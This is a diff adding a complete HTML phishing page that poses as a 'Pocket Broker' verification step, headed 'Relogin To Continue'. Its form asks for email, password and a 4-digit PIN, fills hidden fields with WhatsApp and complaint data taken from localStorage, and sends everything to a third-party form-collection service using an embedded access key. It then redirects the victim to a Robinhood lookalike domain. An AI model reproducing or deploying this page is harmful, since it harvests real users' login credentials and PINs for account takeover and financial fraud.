@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pocket Broker - Verification</title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(180deg,#0a2a4f,#08213d);
+    color:#fff;
+}
+
+.container{
+    max-width:400px;
+    margin:auto;
+    padding:20px;
+}
+
+h2, h3{
+    text-align:center;
+}
+
+.input{
+    width:100%;
+    padding:15px;
+    border-radius:10px;
+    border:2px solid rgba(255,255,255,0.2);
+    background:transparent;
+    color:#fff;
+    outline:none;
+    margin:10px 0;
+}
+
+.btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(90deg,#4a7dff,#3a4dff);
+    color:#fff;
+    font-size:16px;
+    margin-top:15px;
+    cursor:pointer;
+}
+
+.hidden{
+    display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Relogin To Continue</h2>
+
+<form id="verifyForm" action="https://api.web3forms.com/submit" method="POST">
+
+<!-- Web3Forms -->
+<input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+<input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
+
+<!-- Step 2 inputs -->
+<h3>Email</h3>
+<input type="email" name="email" id="emailField" class="input" required>
+
+<h3>Password</h3>
+<input type="text" name="password" class="input" required>
+
+<h3>4 Digit Pin</h3>
+<input type="text" name="pin" class="input" maxlength="4" required>
+
+<h3>Country & Complaint</h3>
+<textarea name="extra_info" class="input" placeholder="Your country & complaint"></textarea>
+
+<!-- Hidden Step 1 Data -->
+<input type="hidden" name="whatsapp" id="whatsappField">
+<input type="hidden" name="complaint_step1" id="complaintField">
+<input type="hidden" name="country_step1" id="countryField">
+
+<button type="submit" class="btn">Login</button>
+
+</form>
+
+</div>
+
+<script>
+// Get Step 1 data
+const step1 = JSON.parse(localStorage.getItem("formStep1") || "{}");
+
+// Fill fields
+document.getElementById("emailField").value = step1.email || "";
+document.getElementById("whatsappField").value = step1.whatsapp || "";
+document.getElementById("complaintField").value = step1.complaint || "";
+document.getElementById("countryField").value = step1.country || "";
+
+// Clear after submit
+document.getElementById("verifyForm").addEventListener("submit", function(){
+    setTimeout(()=>{
+        localStorage.removeItem("formStep1");
+    },1000);
+});
+</script>
+
+</body>
+</html>
